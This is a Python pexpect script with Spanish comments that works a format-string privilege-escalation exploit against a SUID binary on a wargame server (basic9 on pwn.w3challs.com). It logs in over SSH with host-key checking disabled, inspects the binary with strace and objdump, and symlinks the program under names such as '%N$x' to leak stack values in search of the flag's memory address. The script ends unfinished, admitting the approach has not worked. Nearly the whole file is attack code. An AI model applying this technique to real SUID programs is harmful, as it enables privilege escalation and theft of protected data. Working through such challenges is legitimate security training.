#!/usr/bin/env python3

import pexpect

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])
print("[✓] Conectado!")

print("\n[*] Verificando el binario SUID...")

# Ver los permisos exactos
child.sendline(b"ls -la /home/basic9/basic9")
child.expect([b'\\$'])
print(child.before.decode('utf-8', errors='ignore'))

# El binario es SUID y pertenece a basic9_pwned
# Cuando se ejecuta, corre con los permisos de basic9_pwned
# Y puede leer /home/basic9/flag

print("\n[*] Verificando que el programa realmente lee la flag...")

# Usar strace para ver si abre el archivo
child.sendline(b"strace /home/basic9/basic9 2>&1 | grep -E 'open|read' | head -5")
child.expect([b'\\$'], timeout=5)
output = child.before
print(output.decode('utf-8', errors='ignore'))

print("\n[*] El programa SÍ lee la flag. Ahora encontrémosla en memoria...")

# La flag se lee en password[] que está en 0x0804a060
# Pero necesitamos que esté en el stack para leerla con %s

print("\n[*] Idea: tal vez el programa pone password en el stack en algún momento...")

# Veamos el desensamblado
child.sendline(b"objdump -d /home/basic9/basic9 | grep -A20 '<main>'")
child.expect([b'\\$'], timeout=5)
print(child.before.decode('utf-8', errors='ignore'))

print("\n[*] ÚLTIMA ESTRATEGIA: Leer el BSS byte por byte con %hhn...")

# Si no podemos leer strings, podemos leer bytes individuales
child.sendline(b"cd /tmp")
child.expect([b'\\$'])

# Probar a leer valores hexadecimales del stack
for i in range(1, 20):
    cmd = f"ln -sf /home/basic9/basic9 '%{i}$x' && ./'%{i}$x' x 2>&1 | head -3".encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=2)
    output = child.before
    
    try:
        output_str = output.decode('utf-8', errors='ignore')
        # Buscar valores hex
        lines = output_str.split('\n')
        for line in lines:
            if '%' in line and '$x' in line and 'ln -sf' not in line:
                # Extraer el valor hex
                parts = line.split('%')
                if len(parts) > 1:
                    hex_part = parts[1].split('$x')[0]
                    if hex_part and hex_part != str(i):
                        print(f"Posición {i}: {line.strip()}")
                        
                        # Si el valor es 0x0804a060 o cercano, es interesante
                        try:
                            if '804a' in line:
                                print(f"  [!] Posible puntero al BSS!")
                        except:
                            pass
    except:
        pass

print("\n[*] Si el password está en 0x0804a060 y no podemos leerlo con %s,")
print("    es porque no hay un puntero a esa dirección en el stack.")
print("    Necesitaríamos escribir la dirección primero, lo cual es más complejo.")

child.close()
print("\n💀 Puede que necesite un approach diferente... 💀")